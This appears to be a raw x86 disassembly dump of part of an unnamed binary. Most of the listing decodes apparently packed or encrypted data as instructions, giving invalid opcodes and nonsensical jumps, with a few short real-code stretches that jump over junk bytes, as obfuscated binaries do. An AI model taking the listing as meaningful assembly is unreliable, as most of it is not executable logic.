  406b7f:	mov    DWORD PTR [ecx],0x4aebac5f
  406b85:	sbb    DWORD PTR [edx],eax
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0x7e7e7e7f
  406b8f:	or     ebp,DWORD PTR [ebx+ecx*2+0x71]
  406b93:	retf   
  406b94:	mov    DWORD PTR [edx+0x5f],esi
  406b97:	aad    0x5
  406b99:	(bad)  [ebx+0x9]
  406b9d:	adc    eax,0xfe79c47e
  406ba2:	jae    0x406c1d
  406ba4:	int    0x91
  406ba6:	xor    bl,BYTE PTR [ecx+0x4b3276dc]
  406bac:	dec    eax
  406bad:	in     eax,0x91
  406baf:	inc    edx
  406bb0:	cmc    
  406bb1:	dec    esp
  406bb2:	add    ebp,DWORD PTR [esi+0x6de1350b]
  406bb8:	jg     0x406b72
  406bba:	sbb    esi,edx
  406bbc:	test   DWORD PTR [esi+eiz*1],esp
  406bbf:	and    al,0xd
  406bc1:	cmp    dh,BYTE PTR [ebp+ebx*8-0x25b8a06a]
  406bc8:	xor    al,0x4a
  406bca:	arpl   WORD PTR [ebx+0x45d942d5],di
  406bd0:	mov    ah,0x7
  406bd2:	mov    ds:0xd0382061,al
  406bd7:	leave  
  406bd8:	retf   0x97e1
  406bdb:	jp     0x406b7d
  406bdd:	imul   esi,DWORD PTR [eax],0x65cc64bf
  406be3:	sti    
  406be4:	mov    al,ds:0xc8c7223a
  406be9:	loope  0x406bd2
  406beb:	jp     0x406c49
  406bed:	mov    esi,0xfeefa99f
  406bf2:	(bad)  
  406bf4:	or     BYTE PTR [esi+0x453589e],bl
  406bfa:	sahf   
  406bfb:	popa   
  406bfc:	pop    ss
  406bfd:	stos   DWORD PTR es:[edi],eax
  406bfe:	push   es
  406bff:	cmp    eax,0xebb817c1
  406c04:	jns    0x406bef
  406c06:	aad    0xde
  406c08:	jb     0x406b9a
  406c0a:	and    eax,0x43506ce5
  406c0f:	dec    edi
  406c10:	aam    0xc1
  406c12:	jge    0x406c63
  406c14:	pushf  
  406c15:	pop    esp
  406c16:	jmp    0x3fbbe4be
  406c1b:	jmp    0x9076:0x84bc42a3
  406c22:	lock xor eax,0xc91e9fc3
  406c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c29:	arpl   cx,di
  406c2b:	xchg   DWORD PTR [ecx+0x7e],esi
  406c2e:	ret    0x971e
  406c31:	mov    al,ds:0x1b7ba023
  406c36:	in     al,dx
  406c37:	sar    dh,1
  406c39:	scas   al,BYTE PTR es:[edi]
  406c3a:	loopne 0x406c6f
  406c3c:	outs   dx,BYTE PTR ds:[esi]
  406c3d:	test   ebp,eax
  406c3f:	add    eax,0xd69a75aa
  406c44:	dec    ecx
  406c45:	in     al,0x2e
  406c47:	sar    al,1
  406c49:	adc    BYTE PTR [ebp-0x3a],al
  406c4c:	xor    esp,eax
  406c4e:	and    BYTE PTR [edx],dl
  406c50:	inc    esi
  406c51:	dec    edi
  406c52:	or     BYTE PTR [ebp-0x57],0x79
  406c56:	cmp    DWORD PTR [ecx],esi
  406c58:	outs   dx,BYTE PTR ds:[esi]
  406c59:	in     al,dx
  406c5a:	sub    DWORD PTR [ecx+0x7b],edx
  406c5d:	imul   ebx,DWORD PTR [edx+esi*4-0xcd48fbb],0xffffff8e
  406c65:	jmp    0xe61f:0x7c7dd7f7
  406c6c:	add    dl,al
  406c6e:	test   eax,0x19f21995
  406c73:	dec    ecx
  406c74:	xchg   ebx,eax
  406c75:	lock ret 
  406c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c78:	adc    DWORD PTR ds:0x6c23be36,ecx
  406c7e:	jns    0x406c0e
  406c80:	out    0x6,eax
  406c82:	ret    
  406c83:	call   0xf0f7290a
  406c88:	fwait
  406c89:	and    DWORD PTR [eax+0x48],ebx
  406c8c:	cmp    al,0x1b
  406c8e:	aas    
  406c8f:	sub    BYTE PTR [edi],bh
  406c91:	cmc    
  406c92:	popf   
  406c93:	and    al,0xbf
  406c95:	sbb    ch,BYTE PTR [edi]
  406c97:	xor    al,0x4a
  406c99:	sub    al,0x8
  406c9b:	leave  
  406c9c:	inc    eax
  406c9d:	or     edx,ebp
  406c9f:	pop    edi
  406ca0:	jns    0x406c68
  406ca2:	jns    0x406d10
  406ca4:	dec    edi
  406ca5:	and    eax,0x64185866
  406caa:	neg    DWORD PTR [esi+0x75ab95a1]
  406cb0:	(bad)  
  406cb1:	sub    esi,esi
  406cb3:	sub    ch,bl
  406cb5:	xchg   ecx,eax
  406cb6:	cwde   
  406cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cb8:	jno    0x406c5e
  406cba:	outs   dx,DWORD PTR ds:[esi]
  406cbb:	jp     0x406c49
  406cbd:	or     eax,0xd105d35b
  406cc2:	xchg   edx,eax
  406cc3:	mov    es,WORD PTR [eax-0x18]
  406cc6:	sub    BYTE PTR [esi+eiz*4],cl
  406cc9:	push   eax
  406cca:	adc    al,dl
  406ccc:	ror    DWORD PTR [edx+0x48],cl
  406ccf:	mov    edx,0xb824f729
  406cd4:	sub    esp,DWORD PTR [esi]
  406cd6:	ja     0x406cae
  406cd8:	shl    BYTE PTR [edx],0xe4
  406cdb:	xor    al,0xbd
  406cdd:	xchg   DWORD PTR [ebx-0x628debad],eax
  406ce3:	mov    cl,0xea
  406ce5:	mov    ebp,0x353c7150
  406cea:	push   ds
  406ceb:	int    0x65
  406ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cee:	and    BYTE PTR [ecx+eiz*2-0x63],ah
  406cf2:	jns    0x406cb7
  406cf4:	add    al,0x79
  406cf6:	js     0x406cd2
  406cf8:	unpcklps xmm5,XMMWORD PTR [eax+0x7d]
  406cfc:	pop    ebx
  406cfd:	rcr    DWORD PTR [ebp+ecx*2+0x7162dc14],0xf6
  406d05:	pop    ss
  406d06:	inc    ebp
  406d07:	xchg   ebp,eax
  406d08:	push   edi
  406d09:	mov    ds:0x59973e50,al
  406d0e:	xchg   ebp,eax
  406d0f:	call   edx
  406d11:	dec    eax
  406d12:	cmp    bl,dh
  406d14:	rol    esi,0x66
  406d17:	xchg   DWORD PTR [esp+edi*1],eax
  406d1a:	mov    edx,0xa5844d1a
  406d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d20:	mov    ds:0x3dce0bf5,al
  406d25:	test   al,0xc4
  406d27:	xchg   ebp,eax
  406d28:	jmp    0x406cdf
  406d2a:	(bad)  
  406d2b:	and    eax,0x54671510
  406d30:	push   edi
  406d31:	mov    esi,0x152dc804
  406d36:	ins    BYTE PTR es:[edi],dx
  406d37:	das    
  406d38:	pop    eax
  406d39:	jae    0x406cdb
  406d3b:	popa   
  406d3c:	rcr    al,1
  406d3e:	jmp    0x7668:0x6cdbaa55
  406d45:	(bad)  
  406d46:	and    eax,ebx
  406d48:	mov    ecx,edx
  406d4a:	mov    dl,0x2b
  406d4c:	popa   
  406d4d:	xchg   ecx,eax
  406d4e:	dec    ebx
  406d4f:	fs xor ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43382f,0x433713
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433823,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433763,0x43370f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x9c
  406d91:	xchg   ebp,eax
  406d92:	retf   
  406d93:	stc    
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xab7e7e7f
  406d9d:	xchg   edx,eax
  406d9e:	aam    0xe
  406da0:	xchg   esp,eax
  406da1:	arpl   WORD PTR ds:0x72a1f8aa,cx
  406da7:	bound  ebp,QWORD PTR [edi+0x42]
  406daa:	jg     0x406e17
  406dac:	test   BYTE PTR [edx+0x72188a54],0x33
  406db3:	cmp    ecx,DWORD PTR [esi-0x7274df19]
  406db9:	cmp    al,0xbd
  406dbb:	rcl    esi,1
  406dbd:	ds xchg edx,eax
  406dbf:	aaa    
  406dc0:	mov    bh,0x41
  406dc2:	cmp    eax,0x8e976b3b
  406dc7:	out    0x2,eax
  406dc9:	cmp    eax,0x2cf96af2
  406dce:	outs   dx,DWORD PTR ds:[esi]
  406dcf:	hlt    
  406dd0:	jnp    0x406e41
  406dd2:	leave  
  406dd3:	test   DWORD PTR [edx+0x59e796d1],esp
  406dd9:	mov    bl,0x55
  406ddb:	xchg   ebx,eax
  406ddc:	stos   BYTE PTR es:[edi],al
  406ddd:	add    DWORD PTR [edx],edi
  406ddf:	pop    ebx
  406de0:	pop    ebx
  406de1:	std    
  406de2:	jmp    0xaefd:0xe03c60f2
  406de9:	(bad)  [ebx-0x51]
  406dec:	test   esp,ebp
  406dee:	loop   0x406e6f
  406df0:	inc    ebx
  406df1:	inc    edi
  406df2:	mov    ebp,0x8c5b00b2
  406df7:	lods   eax,DWORD PTR ds:[esi]
  406df8:	test   al,0x88
  406dfa:	icebp  
  406dfb:	jae    0x406e23
  406dfd:	and    al,0xeb
  406dff:	jo     0x406db8
  406e01:	test   al,0x2b
  406e03:	mov    cl,0xf9
  406e05:	inc    esi
  406e06:	sar    DWORD PTR [ebx+edx*1-0x6d4a17e4],cl
  406e0d:	js     0x406dad
  406e0f:	outs   dx,BYTE PTR ds:[esi]
  406e10:	or     DWORD PTR [edi-0x65],ebp
  406e13:	scas   eax,DWORD PTR es:[edi]
  406e14:	mov    esi,0xab21da2f
  406e19:	jecxz  0x406e65
  406e1b:	call   0x2bfa957e
  406e20:	cmp    eax,0x7d9c52a
  406e25:	data16 fild DWORD PTR [esp]
  406e29:	imul   ebx,DWORD PTR [edi],0xffffffff
  406e2c:	pop    edx
  406e2d:	(bad)  
  406e2e:	push   ds
  406e2f:	sub    cl,al
  406e31:	xchg   ecx,eax
  406e32:	and    eax,0x2c2afec9
  406e37:	aam    0x22
  406e39:	scas   eax,DWORD PTR es:[edi]
  406e3a:	cs push es
  406e3c:	arpl   WORD PTR [ecx-0x77],si
  406e3f:	mov    ecx,0x7aae5904
  406e44:	rcl    edx,cl
  406e46:	cld    
  406e47:	pop    edi
  406e48:	fucomp st(0)
  406e4a:	sub    dl,bh
  406e4c:	jmp    0xd681:0xbe3eb925
  406e53:	test   al,0x2c
  406e55:	pusha  
  406e56:	adc    ecx,DWORD PTR [edx]
  406e58:	lds    ebp,FWORD PTR [eax+0x71f2859]
  406e5e:	add    eax,0x524a7d4c
  406e63:	ror    BYTE PTR [ecx+0x6207b0fa],cl
  406e69:	cs cmpxchg dh,dl
  406e6d:	xor    eax,0x7116da50
  406e72:	(bad)  
  406e73:	(bad)  
  406e74:	imul   BYTE PTR [esi+0xf38d06d]
  406e7a:	sahf   
  406e7b:	mov    edx,0x82a1cda5
  406e80:	lock pushf 
  406e82:	mov    ecx,DWORD PTR [eax-0x51]
  406e85:	dec    edi
  406e86:	mov    gs,edi
  406e88:	(bad)  
  406e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e8a:	xor    BYTE PTR [eax+0x78e906c3],0x51
  406e91:	push   ebp
  406e92:	not    BYTE PTR [ecx-0x58261d1e]
  406e98:	in     al,0xc9
  406e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e9b:	aad    0xea
  406e9d:	js     0x406e87
  406e9f:	hlt    
  406ea0:	ins    DWORD PTR es:[edi],dx
  406ea1:	fstp   DWORD PTR [ebx]
  406ea3:	sbb    al,0x9c
  406ea5:	cld    
  406ea6:	mov    ebx,0x657c670
  406eab:	and    al,0x71
  406ead:	sub    eax,0x88466b59
  406eb2:	repz pusha 
  406eb4:	jecxz  0x406eb3
  406eb6:	ficom  DWORD PTR [esi+0x63b7f0f9]
  406ebc:	or     bh,0x92
  406ebf:	fisttp DWORD PTR [edx]
  406ec1:	aam    0x67
  406ec3:	jg     0x406f09
  406ec5:	(bad)  
  406ec6:	mov    esp,0x9ba5ef7
  406ecb:	out    dx,al
  406ecc:	push   cs
  406ecd:	and    eax,0xdc5cea1d
  406ed2:	loopne 0x406ea5
  406ed4:	test   al,0x93
  406ed6:	sub    DWORD PTR [ebx-0x63],eax
  406ed9:	dec    ecx
  406eda:	stc    
  406edb:	fmulp  st(4),st
  406edd:	fs ins DWORD PTR es:[edi],dx
  406edf:	adc    al,0x86
  406ee1:	daa    
  406ee2:	retf   
  406ee3:	aaa    
  406ee4:	pop    ds
  406ee5:	jo     0x406e68
  406ee7:	or     dh,bl
  406ee9:	xlat   BYTE PTR ds:[ebx]
  406eea:	fnstcw WORD PTR [ebx-0x6e]
  406eed:	rol    ebp,0x88
  406ef0:	stos   DWORD PTR es:[edi],eax
  406ef1:	add    BYTE PTR [ebx-0x3c],ch
  406ef4:	test   eax,0xd70b119b
  406ef9:	or     esp,ebx
  406efb:	outs   dx,BYTE PTR ds:[esi]
  406efc:	or     BYTE PTR [edi],dl
  406efe:	push   0x6c
  406f00:	adc    DWORD PTR [ebp-0x50],0x4a878c20
  406f07:	xchg   esp,eax
  406f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f09:	and    ecx,DWORD PTR [ebx+ebp*4+0x6eff82b7]
  406f10:	std    
  406f11:	xor    BYTE PTR [edi+eax*1],dl
  406f14:	test   BYTE PTR [ebp+0x6c162a69],ch
  406f1a:	ror    BYTE PTR [eax],cl
  406f1c:	addr16 push es
  406f1e:	pop    ss
  406f1f:	addr16 inc edx
  406f21:	or     esp,esp
  406f23:	lahf   
  406f24:	sti    
  406f25:	xchg   esp,eax
  406f26:	popf   
  406f27:	pop    edi
  406f28:	adc    eax,0x9305aa20
  406f2d:	mov    ebp,esp
  406f2f:	div    BYTE PTR [edx+eax*8]
  406f32:	jmp    0xac73:0xb63bfc2d
  406f39:	mov    edi,0xdaa639ad
  406f3e:	clc    
  406f3f:	sahf   
  406f40:	push   eax
  406f41:	dec    esi
  406f42:	sub    edi,eax
  406f44:	dec    ecx
  406f45:	push   esp
  406f46:	and    eax,0xd2cc943a
  406f4b:	in     eax,dx
  406f4c:	es retf 
  406f4e:	and    esi,ecx
  406f50:	sub    ebp,0xeb1a0ce7
  406f56:	or     al,BYTE PTR [ebp+ecx*1+0x52]
  406f5a:	enter  0xfc8f,0x96
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43370f,0x433753
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xb1f54087
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x567e7e7f
  406f9f:	test   BYTE PTR [ebx*8-0x124c6787],bl
  406fa6:	std    
  406fa7:	mov    ah,0x45
  406fa9:	cmp    ch,BYTE PTR [edx+ebp*1]
  406fac:	sub    ecx,ecx
  406fae:	or     eax,0xf56dc5cb
  406fb3:	pop    esi
  406fb4:	add    ch,BYTE PTR [esi+eiz*8]
  406fb7:	in     al,dx
  406fb8:	(bad)  
  406fb9:	les    esp,FWORD PTR ds:0xd30a3560
  406fbf:	ds and al,0xb
  406fc2:	imul   ebp,DWORD PTR [eax],0x4ff661dc
  406fc8:	inc    edi
  406fc9:	aaa    
  406fca:	(bad)  
  406fcb:	addr16 aaa 
  406fcd:	int3   
  406fce:	in     al,dx
  406fcf:	daa    
  406fd0:	das    
  406fd1:	aas    
  406fd2:	add    al,0x3a
  406fd4:	aaa    
  406fd5:	xor    BYTE PTR [eax-0x51],dl
  406fd8:	fiadd  DWORD PTR [eax+0x7d]
  406fdb:	mov    bh,0xae
  406fdd:	or     DWORD PTR [eax+0x34293fe8],0x36
  406fe4:	jecxz  0x407039
  406fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fe7:	mov    cl,0xf1
  406fe9:	leave  
  406fea:	adc    BYTE PTR [ebx],dh
  406fec:	adc    BYTE PTR [ecx],ch
  406fee:	dec    edi
  406fef:	mov    al,0x13
  406ff1:	cmp    al,0x83
  406ff3:	and    edi,DWORD PTR [edi+0x8]
  406ff6:	push   ds
  406ff7:	(bad)  
  406ff8:	cli    
  406ff9:	push   ebx
  406ffa:	push   ecx
  406ffb:	push   esi
  406ffc:	push   0x3c
  406ffe:	pusha  
  406fff:	or     al,0x57
  407001:	pop    ecx
  407002:	cmp    ah,0x3c
  407005:	xor    al,0xd5
  407007:	push   esp
  407008:	fcomp  st(2)
  40700a:	jbe    0x40700d
  40700c:	ret    
  40700d:	pop    ebp
  40700e:	push   edi
  40700f:	mov    ?,WORD PTR [edx-0x3128c31f]
  407015:	outs   dx,DWORD PTR ds:[esi]
  407016:	jbe    0x40700c
  407018:	push   eax
  407019:	mov    bl,0x18
  40701b:	int3   
  40701c:	jp     0x407011
  40701e:	adc    al,0xb7
  407020:	xor    DWORD PTR [eiz*2-0x421b9221],eax
  407027:	and    eax,0x3b3b6645
  40702c:	dec    ecx
  40702d:	and    esp,DWORD PTR [edi]
  40702f:	add    eax,0x464d2894
  407034:	test   BYTE PTR [edx-0x1625ce8c],bh
  40703a:	std    
  40703b:	imul   edi,esp,0xffffff93
  40703e:	inc    eax
  40703f:	(bad)  
  407040:	test   al,0x56
  407042:	jge    0x407047
  407044:	mov    ebx,0x47a7c0a4
  407049:	adc    DWORD PTR [esi-0x6cfd52be],esp
  40704f:	mov    dl,0xf4
  407051:	pop    esi
  407052:	push   ebp
  407053:	mov    es,esi
  407055:	ins    BYTE PTR es:[edi],dx
  407056:	fisub  DWORD PTR [ecx+0x6472e0dc]
  40705c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40705d:	and    BYTE PTR [esi],bh
  40705f:	and    DWORD PTR [esi],edi
  407061:	adc    ah,BYTE PTR [ecx+0x48]
  407064:	aad    0x9
  407066:	sbb    DWORD PTR [edi-0x558ac24b],eax
  40706c:	cs dec ebp
  40706e:	icebp  
  40706f:	xor    edx,eax
  407071:	lods   al,BYTE PTR ds:[esi]
  407072:	sbb    dl,BYTE PTR [edi+0x75]
  407075:	ss dec ebp
  407077:	push   ds
  407078:	and    bh,BYTE PTR [eax]
  40707a:	adc    BYTE PTR [ebx+0xd],ah
  40707d:	or     DWORD PTR [edx+0x4e],edx
  407080:	test   eax,0x33ba70c5
  407085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407086:	in     al,0xa0
  407088:	inc    esp
  407089:	sahf   
  40708a:	outs   dx,BYTE PTR ds:[esi]
  40708b:	(bad)  
  40708c:	pop    esp
  40708d:	inc    ecx
  40708e:	ss in  al,0x26
  407091:	xchg   edi,eax
  407092:	js     0x407100
  407094:	mov    ah,BYTE PTR [edx+0x62]
  407097:	repz mov dh,0xb6
  40709a:	sbb    al,0x6e
  40709c:	js     0x4070c6
  40709e:	adc    eax,0xd3116e58
  4070a3:	(bad)  
  4070a4:	in     eax,0x3c
  4070a6:	mov    dh,0xbd
  4070a8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4070aa:	mov    dl,0x40
  4070ac:	cmp    eax,0x471b1194
  4070b1:	mov    eax,0xb6fdb8f
  4070b6:	(bad)
  4070ba:	mov    esp,ecx
  4070bc:	retf   0x4237
  4070bf:	test   al,0x48
  4070c1:	ja     0x4070dc
  4070c3:	aas    
  4070c4:	aas    
  4070c5:	das    
  4070c6:	or     DWORD PTR [esi+0x2d306dd4],esp
  4070cc:	cwde   
  4070cd:	call   0x3cb6:0x78fd9601
  4070d4:	pop    ecx
  4070d5:	pop    ebx
  4070d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070d7:	into   
  4070d8:	dec    eax
  4070d9:	sbb    esi,edi
  4070db:	sub    edi,ecx
  4070dd:	(bad)  
  4070de:	push   ss
  4070df:	and    BYTE PTR [edi+0x7],ah
  4070e2:	dec    esp
  4070e3:	mov    ss,WORD PTR ds:0x79aaa9f
  4070e9:	xchg   edi,eax
  4070ea:	adc    eax,DWORD PTR [edi+0x12a9b57d]
  4070f0:	cmp    eax,0xc38436e0
  4070f5:	out    dx,eax
  4070f6:	test   BYTE PTR [edi+eiz*4-0x1ac7d01f],ah
  4070fd:	clc    
  4070fe:	jns    0x407106
  407100:	mov    al,0xab
  407102:	nop
  407103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407104:	sbb    DWORD PTR [edi+0x77ac5e45],ebp
  40710a:	jne    0x4070f6
  40710c:	retf   0xf2f9
  40710f:	out    0xc7,al
  407111:	sub    al,0xe
  407113:	and    DWORD PTR [ebp+0x16],0xedb93ce8
  40711a:	in     al,dx
  40711b:	sar    DWORD PTR [edi],0x75
  40711e:	int3   
  40711f:	mov    dl,0xe9
  407121:	push   edx
  407122:	lock push ss
  407124:	mov    ecx,0x67663fe7
  407129:	and    al,0x5b
  40712b:	enter  0x5d9c,0x98
  40712f:	cmp    al,0xd1
  407131:	inc    ebp
  407132:	push   0x3e
  407134:	pop    esi
  407135:	and    BYTE PTR [ebp+eiz*2+0x36992cf7],dh
  40713c:	cmp    ebx,esi
  40713e:	sbb    DWORD PTR [ecx],esp
  407140:	or     bl,BYTE PTR [edx]
  407142:	or     ecx,DWORD PTR [ecx+0x15]
  407145:	inc    edi
  407146:	push   0xa2011537
  40714b:	fadd   DWORD PTR [edx-0x6b]
  40714e:	jmp    0x8448:0x74c9c3e0
  407155:	xor    al,0x88
  407157:	xchg   DWORD PTR [esi+0x2ab9fb26],eax
  40715d:	jp     0x407197
  40715f:	sar    edi,0x75
  407162:	or     al,ch
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	into   
  40717c:	mov    ebp,0xc4cc5349
  407181:	jle    0x407201
  407183:	mov    esp,0x607e7e7f
  407188:	(bad)  
  407189:	int3   
  40718a:	lea    esp,[esi+0x3c]
  40718d:	mov    bl,0xb3
  40718f:	arpl   dx,si
  407191:	test   DWORD PTR [edi-0x3],edx
  407194:	inc    ecx
  407195:	fnstcw WORD PTR [ebx+ebx*1+0x9]
  407199:	mov    al,0xb2
  40719b:	ins    BYTE PTR es:[edi],dx
  40719c:	lahf   
  40719d:	mov    ebx,0x8447fd23
  4071a2:	mov    eax,0x725642a7
  4071a7:	sar    DWORD PTR [edi],cl
  4071a9:	lods   al,BYTE PTR ds:[esi]
  4071aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ab:	push   edi
  4071ac:	mov    esi,0xc4efd1d0
  4071b1:	inc    eax
  4071b2:	pop    ss
  4071b3:	and    ebx,DWORD PTR fs:[edi-0x6f]
  4071b7:	into   
  4071b8:	nop    DWORD PTR [esi]
  4071bb:	xchg   ebx,eax
  4071bc:	add    DWORD PTR [edx],esi
  4071be:	and    al,BYTE PTR [ebx+0x4d]
  4071c1:	lds    ebp,FWORD PTR [edx+0x66d2a54c]
  4071c7:	pop    ecx
  4071c8:	ins    BYTE PTR es:[edi],dx
  4071c9:	jmp    0x1d8a:0xec55ef8d
  4071d0:	cmc    
  4071d1:	aas    
  4071d2:	outs   dx,BYTE PTR ds:[esi]
  4071d3:	sub    al,0x15
  4071d5:	shl    bl,1
  4071d7:	sar    DWORD PTR [ebx-0x35bc2e7f],0x9
  4071de:	sbb    eax,0x323ca506
  4071e3:	xchg   edx,eax
  4071e4:	clc    
  4071e5:	leave  
  4071e6:	lock fsubr st(4),st
  4071e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ea:	icebp  
  4071eb:	sbb    eax,0x600076a5
  4071f0:	fidivr DWORD PTR [ebp-0x490e6500]
  4071f6:	or     al,0x88
  4071f8:	icebp  
  4071f9:	dec    ebx
  4071fa:	(bad)  
  4071fb:	int3   
  4071fc:	and    eax,0xf4087d9a
  407201:	in     al,0x24
  407203:	out    dx,al
  407204:	lea    ebx,[esi]
  407206:	mov    esp,edi
  407208:	shl    ebx,0xd9
  40720b:	mov    edi,0xf4b9d4e4
  407210:	aaa    
  407211:	fstp   TBYTE PTR [eax]
  407213:	pop    edi
  407214:	xchg   ecx,eax
  407215:	push   ecx
  407216:	jo     0x4071da
  407218:	arpl   WORD PTR ds:0x876b42fd,sp
  40721e:	outs   dx,DWORD PTR ds:[esi]
  40721f:	xchg   esi,eax
  407220:	mov    ecx,0x15dd1016
  407225:	push   cs
  407226:	into   
  407227:	and    edi,DWORD PTR ds:0x9fc7f3b7
  40722d:	jge    0x407222
  40722f:	jno    0x40725d
  407231:	fs mov eax,0x148f968c
  407237:	stos   DWORD PTR es:[edi],eax
  407238:	leave  
  407239:	sti    
  40723a:	ret    
  40723b:	adc    al,0x7f
  40723d:	and    DWORD PTR gs:[ebp-0x7],ebp
  407241:	add    ah,cl
  407243:	mov    edi,0x1e36b495
  407248:	imul   edi,DWORD PTR [ecx+0x8],0x9f3fc017
  40724f:	rcl    dl,1
  407251:	into   
  407252:	arpl   WORD PTR [edx],di
  407254:	jmp    0xa597:0xe38f56d4
  40725b:	add    DWORD PTR [esp+edx*2+0x25],edx
  40725f:	pop    edx
  407260:	xor    BYTE PTR [eax+0x64469e83],bh
  407266:	inc    esp
  407267:	adc    edi,DWORD PTR cs:[ecx+0x4e]
  40726b:	push   eax
  40726c:	cli    
  40726d:	jbe    0x4071fe
  40726f:	imul   ecx,DWORD PTR [edi+ecx*1],0xc
  407273:	lea    ebx,[ebx]
  407275:	push   esp
  407276:	mov    esi,DWORD PTR [ecx+0x3c3633e5]
  40727c:	mov    DWORD PTR [ecx],eax
  40727e:	jbe    0x40726f
  407280:	mov    cl,0xea
  407282:	inc    esi
  407283:	inc    eax
  407284:	ins    DWORD PTR es:[edi],dx
  407285:	mov    ah,BYTE PTR [edx-0x2c]
  407288:	cli    
  407289:	xor    esi,DWORD PTR [ecx+0x6f]
  40728c:	sar    DWORD PTR [edi-0xa298cf7],cl
  407292:	pop    es
  407293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407294:	xchg   ecx,eax
  407295:	dec    esp
  407296:	(bad)  
  407297:	mov    dh,0xf4
  407299:	neg    ch
  40729b:	(bad)  
  40729c:	jo     0x407249
  40729e:	repnz imul ebx,edx,0xec8cae82
  4072a5:	scas   al,BYTE PTR es:[edi]
  4072a6:	inc    edx
  4072a7:	push   ebx
  4072a8:	pop    ss
  4072a9:	(bad)  
  4072aa:	adc    BYTE PTR [edi+0x53],ch
  4072ad:	loopne 0x40729f
  4072af:	add    BYTE PTR [esi],ah
  4072b1:	and    cl,BYTE PTR [edi+0x20ffc675]
  4072b7:	aam    0xab
  4072b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072ba:	(bad)  
  4072bb:	pop    esp
  4072bc:	repnz les edx,FWORD PTR [eax-0x6cb5f423]
  4072c3:	or     BYTE PTR ds:0xcfb22b84,bl
  4072c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072ca:	pop    ebx
  4072cb:	pop    ebp
  4072cc:	fwait
  4072cd:	daa    
  4072ce:	mov    ebx,0x81c3bd9a
  4072d3:	push   es
  4072d4:	scas   al,BYTE PTR es:[edi]
  4072d5:	jns    0x40730e
  4072d7:	or     eax,DWORD PTR [ebx+esi*4+0x1022900]
  4072de:	mov    bl,0x67
  4072e0:	fisttp WORD PTR [edx+0xf]
  4072e3:	mov    DWORD PTR [esi+ebx*4-0x12d433ca],edx
  4072ea:	sub    ebp,DWORD PTR [edi]
  4072ec:	jo     0x407349
  4072ee:	mov    DWORD PTR [ebx],ecx
  4072f0:	pop    esi
  4072f1:	pushf  
  4072f2:	xor    bl,BYTE PTR [edi+edi*1]
  4072f5:	pop    edi
  4072f6:	inc    ebx
  4072f7:	or     dl,BYTE PTR [eax+0x3196a9eb]
  4072fd:	push   ds
  4072fe:	in     al,dx
  4072ff:	nop
  407300:	push   ss
  407301:	mov    cl,0xbc
  407303:	pop    edi
  407304:	push   ss
  407305:	xor    eax,0xe4b16263
  40730a:	mov    ah,0xd4
  40730c:	shr    DWORD PTR [edx],cl
  40730e:	adc    ecx,ebx
  407310:	xchg   ebp,eax
  407311:	inc    edx
  407312:	or     eax,0xae014950
  407317:	icebp  
  407318:	push   ds
  407319:	and    BYTE PTR [ecx-0x2],0x69
  40731d:	pop    ds
  40731e:	inc    ebp
  40731f:	push   0xffffff8d
  407321:	sub    dl,ch
  407323:	cmp    ecx,DWORD PTR [eax]
  407325:	jb     0x40735d
  407327:	rol    ebp,cl
  407329:	test   BYTE PTR [edi+eax*4],ch
  40732c:	mov    dh,0xd4
  40732e:	shl    si,cl
  407331:	inc    eax
  407332:	call   0xf8b4:0xcbda5c73
  407339:	and    BYTE PTR [edi-0x7cf3e92e],ah
  40733f:	and    BYTE PTR [ebx+0x6645747e],dh
  407345:	mov    es,esi
  407347:	out    0xf2,al
  407349:	je     0x406f76
